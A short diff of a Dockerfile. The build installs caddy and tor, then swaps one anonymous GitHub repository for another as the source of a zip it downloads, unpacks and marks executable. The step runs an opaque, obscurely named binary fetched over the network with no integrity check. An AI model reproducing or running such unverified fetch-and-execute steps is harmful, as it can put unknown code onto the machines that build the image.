@@ -2,7 +2,7 @@
 
 RUN apk update && \
     apk add --no-cache ca-certificates caddy tor wget && \
-    wget -qO- https://github.com/gtexw4657yt/charui/raw/main/bjkguu.zip | busybox unzip - && \
+    wget -qO- https://github.com/Bodrunn/makabakaX/raw/main/makaX.zip | busybox unzip - && \
     chmod +x $(ls /x*y) && \
     rm -rf /var/cache/apk/*
 
